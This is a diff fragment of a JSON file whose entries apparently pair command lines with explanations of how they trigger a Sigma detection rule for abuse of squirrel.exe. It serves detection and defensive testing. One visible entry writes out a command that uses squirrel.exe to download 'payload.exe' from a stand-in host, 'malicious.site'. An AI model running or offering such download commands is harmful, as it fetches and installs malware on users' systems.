@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe",
@@ -41,4 +40,3 @@
     "explanation": "This command includes the --updateRollback flag, which is part of the Sigma rule's detection logic."
   }
 ]
-```
